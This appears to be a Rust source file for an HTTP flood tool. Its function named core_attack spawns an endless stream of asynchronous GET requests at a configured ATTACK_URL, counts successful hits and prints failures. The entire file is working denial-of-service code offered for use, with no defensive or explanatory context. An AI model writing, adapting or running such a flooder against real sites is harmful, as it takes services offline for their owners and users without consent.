use reqwest::Response;

static mut AMOUNT: u128 = 0;

pub async fn start() {
    core_attack();
}
async fn request(url: &str) -> Result<Response, reqwest::Error> {
    let output = reqwest::Client::new().get(url).send().await;
    return match output {
        Ok(data) => Ok(data),
        Err(err) => Err(err),
    };
}

fn core_attack() {
    loop {
        tokio::spawn(async {
            let error_data = request(&crate::ATTACK_URL).await;
            match error_data {
                Ok(_) => unsafe {
                    AMOUNT = AMOUNT + 1;
                    println!("{}", AMOUNT);
                },
                Err(data) => {
                    println!("OH NO BAD Status Code Recived is {}", data.to_string())
                }
            }
        });
    }
}
